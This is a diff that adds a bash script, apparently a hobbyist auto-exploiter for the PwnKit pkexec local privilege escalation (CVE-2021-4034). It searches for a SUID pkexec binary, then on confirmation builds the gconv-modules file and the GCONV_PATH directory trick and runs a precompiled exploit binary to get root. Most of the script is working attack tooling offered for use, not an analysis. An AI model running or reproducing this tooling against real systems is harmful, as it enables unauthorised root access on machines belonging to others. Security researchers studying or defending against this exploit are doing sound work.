@@ -1,0 +1,90 @@
+#!/bin/bash
+# Author: T3sla
+# NOOB CODE
+# Perhaps a double check is unnecessary But better to be sure lol
+# Thx: https://www.deepl.com/translator, http://github.com/s4vitar/htbExplorer Colours, https://github.com/berdav/CVE-2021-4034 https://patorjk.com/software/taag/ (Banner ASCII) 
+
+# Colours (Thx s4vitar)
+declare -r greenColour="\e[0;32m\033[1m"
+declare -r endColour="\033[0m\e[0m"
+declare -r redColour="\e[0;31m\033[1m"
+declare -r blueColour="\e[0;34m\033[1m"
+declare -r yellowColour="\e[0;33m\033[1m"
+declare -r purpleColour="\e[0;35m\033[1m"
+declare -r turquoiseColour="\e[0;36m\033[1m"
+declare -r grayColour="\e[0;37m\033[1m"
+
+export FILE=suid.txt 
+
+function banner()
+{
+	echo "
+	██████  ██     ██ ███    ██ ██   ██ ██ ████████      █████  ██    ██ ████████  ██████  ██████  ██     ██ ███    ██ 
+	██   ██ ██     ██ ████   ██ ██  ██  ██    ██        ██   ██ ██    ██    ██    ██    ██ ██   ██ ██     ██ ████   ██ 
+	██████  ██  █  ██ ██ ██  ██ █████   ██    ██        ███████ ██    ██    ██    ██    ██ ██████  ██  █  ██ ██ ██  ██ 
+	██      ██ ███ ██ ██  ██ ██ ██  ██  ██    ██        ██   ██ ██    ██    ██    ██    ██ ██      ██ ███ ██ ██  ██ ██ 
+	██       ███ ███  ██   ████ ██   ██ ██    ██        ██   ██  ██████     ██     ██████  ██       ███ ███  ██   ████ 
+	" | lolcat -a -d 4 -s 12
+}
+banner
+
+echo -e '\n'
+
+function pkexec_suid()
+{
+	echo -e "${purpleColour}Looking for the pkexec binary to be SUID (;${endColour}"
+	find / -user root -perm -4000 -print 2>/dev/null | grep pkexec > $FILE
+	sleep 1
+}
+pkexec_suid
+
+echo -e '\n'
+
+function determine_pkexec()
+{
+	vulnerable_suid=/usr/bin/pkexec
+
+	cat suid.txt | grep $vulnerable_suid &>/dev/null
+	if [ $? -ne 1 ]
+	then 
+		echo -e "${greenColour}Found pkexec SUID (;${endColour}"
+		sleep 0.7
+		echo $vulnerable_suid
+		echo "path absolute"
+		ls -l /usr/bin/pkexec
+		which true
+	else 
+		echo -e "${redColour}Not Found pkexec SUID );${endColour}"
+	fi
+}
+determine_pkexec
+
+echo -e '\n'
+
+function pkexec_explotation-question()
+{
+	echo -e "${purpleColour}all indications are that it is vulnerable (permissions check only) Do you want to exploit? : [yes/no]${endColour}"
+	read answer
+	if [ $answer == yes ]
+	then
+		echo -e "${purpleColour}Starting exploit!${endColour}"
+		sleep 0.9
+		mkdir PoC/ ; mv pwnkit-pwn pwnkit.so cve-2021-4034 PoC ; cd PoC
+		echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
+		mkdir -p GCONV_PATH=.
+		echo -e "${yellowColour}Enter the absolute path of the true binary:${endColour}"
+		read true
+		cp $true GCONV_PATH=./pwnkit.so:.
+		chmod 777 cve-2021-4034
+		echo -e "${greenColour}execution of the binary${endColour}"
+		sleep 5
+		./cve-2021-4034
+		
+	else
+		echo -e '\n'
+		echo -e "${redColour}Canceled!${endColour}"
+		return 1
+	fi
+}
+pkexec_explotation-question
+
